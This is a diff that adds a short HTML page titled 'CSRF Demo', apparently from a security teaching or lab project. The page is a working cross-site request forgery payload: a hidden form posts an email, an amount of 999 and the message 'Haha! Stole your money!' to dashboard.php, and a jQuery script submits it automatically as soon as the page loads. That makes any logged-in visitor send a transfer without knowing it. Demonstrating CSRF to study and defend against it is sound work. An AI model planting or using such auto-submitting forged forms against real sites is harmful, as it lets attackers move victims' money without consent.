@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>CSRF Demo</title>
+    </head>
+    <body>
+        <form action="dashboard.php" method="post" id="form">
+            <input type="hidden" name="email" value="test@gmail.com">
+            <input type="hidden" name="amount" value="999">
+            <input type="hidden" name="message" value="Haha! Stole your money!">
+            <input type="hidden" name="register" value="register">
+        </form>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+        <script>
+            $(function(){
+               $("#form").submit(); 
+            });
+        </script>
+    </body>
+</html>
